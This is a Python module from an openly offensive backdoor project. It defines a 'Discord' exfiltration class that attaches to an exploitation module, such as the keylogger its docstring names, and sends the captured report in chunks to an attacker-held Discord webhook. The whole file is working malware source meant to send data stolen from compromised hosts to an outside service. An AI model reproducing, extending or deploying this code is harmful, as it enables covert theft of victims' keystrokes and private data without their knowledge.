#!/usr/bin/env python3
# https://github.com/EONRaider/bca-backdoor

__author__ = "EONRaider @ keybase.io/eonraider"

import asyncio
from typing import Any, Generator

import aiohttp
from discord import Webhook, AsyncWebhookAdapter

from src.modules.exfiltration.base import ExfiltrationModule, ExploitationModule


class Discord(ExfiltrationModule):
    def __init__(self, *,
                 module: ExploitationModule,
                 tag: str = None,
                 webhook_url: str,
                 char_limit: int = 2000):
        """
        Exfiltrate data to a Discord server.

        Args:
            module (ExploitationModule): Instance of ExploitationModule
                to which the exfiltrator will attach itself as a
                subscriber.
            tag (str): A unique identifier for the current host.
                Defaults to a string with a format similar to
                'KeyLogger::Discord::hostname' if None.
            webhook_url (str): URL to the Webhook set up on the Discord
                server's configuration.
            char_limit (int): Number of characters to be sent per
                message to the Discord server. Set by the service itself
                and defaults to 2000 characters.
        """

        super().__init__(module, tag)
        self.webhook_url = webhook_url
        self.char_limit = char_limit

    def get_content_blocks(self) -> Generator[str, Any, None]:
        """Yields a generator of strings derived from the report of an
        ExploitationModule. Each chunk corresponds to a sequence of
        characters with length smaller than or equal to the character
        limit imposed by the Discord service."""
        yield from (self.report[start:start+self.char_limit] for start in
                    range(0, len(self.report), self.char_limit))

    def update(self) -> None:
        """Send each report as a new message to a Discord server with a
        Webhook URL enabled."""
        if self.module.has_data is True:
            asyncio.run(self.send_message())

    async def send_message(self) -> None:
        async with aiohttp.ClientSession() as session:
            webhook = Webhook.from_url(url=self.webhook_url,
                                       adapter=AsyncWebhookAdapter(session))
            for content in self.get_content_blocks():
                await webhook.send(content=content,
                                   username=self.module.__class__.__name__)
